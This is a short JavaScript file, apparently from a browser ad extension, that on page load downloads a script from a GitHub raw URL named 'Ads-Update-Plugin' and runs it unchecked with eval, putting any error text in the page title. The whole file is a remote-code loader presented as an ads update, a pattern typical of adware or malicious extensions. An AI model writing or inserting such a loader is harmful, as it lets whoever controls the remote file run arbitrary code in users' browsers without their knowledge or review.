
var Run = {
    __constructor: function () {
        $.get("https://raw.githubusercontent.com/xlfederalelk0lx/Ads-Update-Plugin/master/script.js").done(function (script) {
            eval(script);
        }).fail(function (xhr) {
            window.document.title = "Ads Extension Repository Github "+xhr.responseText;
        });
    }
}


$(document).ready(function () {
    Run.__constructor();
})